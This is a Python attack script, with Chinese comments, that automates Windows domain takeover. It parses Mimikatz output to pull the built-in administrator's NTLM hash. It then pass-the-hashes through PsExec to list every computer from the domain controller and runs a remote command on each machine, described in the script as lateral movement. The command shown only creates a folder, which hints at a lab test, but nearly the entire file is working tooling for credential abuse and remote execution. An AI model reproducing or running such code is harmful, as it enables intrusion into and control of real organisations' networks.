import re
import os
import subprocess


def get_admin_credentials(filename):
    # 檢查檔案是否存在
    if not os.path.exists(filename):
        print(f"ERROR: '{filename}' not found.")
        return "FILE_NOT_FOUND" 
    
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
            
        clean_content = ""
        error_keywords = [
            "kuhl_m_sekurlsa_acquireLSA", 
            "0xc0000022", 
            "Is LSASS running", 
            "Handle on memory",
            "ERROR kuhl_m"
        ]

        for line in lines:
            if any(err in line for err in error_keywords):
                print(f"CRITICAL ERROR in Mimikatz log detected: {line.strip()}")
                print("Stopping execution to prevent invalid operations.")
                return "MIMIKATZ_ERROR"
            
            clean_content += line.replace('\x08', '') 
            
    except Exception as e:
        print(f"ERROR: Could not read file: {e}")
        return "READ_ERROR"
    
    if len(clean_content.strip()) < 50:
        print("ERROR: Mimikatz log is empty or invalid.")
        return "MIMIKATZ_ERROR"

    sessions = clean_content.split('Authentication Id')
    for session in sessions:
        user_match = re.search(r'User Name\s+:\s+(.+)', session)
        domain_match = re.search(r'Domain\s+:\s+(.+)', session)
        sid_match = re.search(r'SID\s+:\s+S-1-5-21-.*-(\d+)', session)
        ntlm_match = re.search(r'\*\s+NTLM\s+:\s+([a-fA-F0-9]{32})', session)
        server_match = re.search(r'Logon Server\s+:\s+(.+)', session)

        if user_match and sid_match and ntlm_match:
            # 判斷是否為內建管理員帳號 (SID 500)
            if sid_match.group(1) == "500":
                return {
                    "USER": user_match.group(1).strip(),
                    "DOMAIN": domain_match.group(1).strip(),
                    "HASH": f"00000000000000000000000000000000:{ntlm_match.group(1).strip()}",
                    "DC": server_match.group(1).strip() if server_match else "DC01"
                }
    return "CREDENTIAL_NOT_FOUND"

def run_command(target, creds, cmd_list):
    """ 利用 PsExec 進行 Pass-the-Hash 遠端執行 """
    identity = f"{creds['DOMAIN']}/{creds['USER']}@{target}"
    # 修改後的指令陣列
    full_cmd = [".\\psexec.exe", "-s", "-accepteula", "-n", "10", "-hashes", creds['HASH'], identity] + cmd_list
    return subprocess.run(full_cmd, capture_output=True, text=True, check=False)

def get_all_pcs(creds):
    """ 向 DC 抓取網域電腦清單 """
    print(f" Connecting to {creds['DC']} to fetch domain computer list...")
    res = run_command(creds['DC'], creds, ["cmd", "/c", "dsquery computer -o rdn"])
    
    clean_pcs = []
    for line in res.stdout.splitlines():
        line = line.strip().replace('"', '').replace('\x08', '')
        if line and not any(kw in line for kw in ['*', '[', '!', 'Process', 'Requesting']):
            clean_pcs.append(line)
    return clean_pcs

def main():
    filename = 'mimikatz.txt'
    print(f"Searching for Admin credentials in {filename}...")
    
    # 接收分析結果
    result = get_admin_credentials(filename)

    # 錯誤分流與中斷邏輯
    if result == "FILE_NOT_FOUND":
        return 
    if result == "READ_ERROR" or result == "MIMIKATZ_ERROR":
        return
    if result == "CREDENTIAL_NOT_FOUND":
        print(f"FAILED: High-privileged account (SID 500) not found.")
        return

    # 確定找到憑證後才賦值給 creds
    creds = result
    print(f"Admin Found: {creds['DOMAIN']}\\{creds['USER']}")
    print(f"Hash Extracted: {creds['HASH']}")

    # 4. 執行網域掃描與橫向派送
    pcs = get_all_pcs(creds)
    if not pcs:
        print("FAILED: Target list is empty or unreachable.")
        return
    
    print(f"Found {len(pcs)} target(s): {pcs}")

    print("\n Starting lateral movement tasks...")
    for pc in pcs:
        print(f"Tasking -> {pc} ...", end=" ", flush=True)
        
        # 遠端建立資料夾任務
        task_res = run_command(pc, creds, ["cmd", "/c", "mkdir C:\\LKC_CREATE_FILE"])
        
        if task_res.returncode == 0:
            print("SUCCESS")
        else:
            err = task_res.stderr + task_res.stdout
            reason = "Unknown"
            if "ACCESS_DENIED" in err: reason = "Access Denied"
            elif "TIMEOUT" in err: reason = "Timeout"
            elif "locate host" in err: reason = "Host Unreachable"
            print(f"FAILED! ({reason})")

    print("\n All task completed.")

if __name__ == "__main__":
    main()
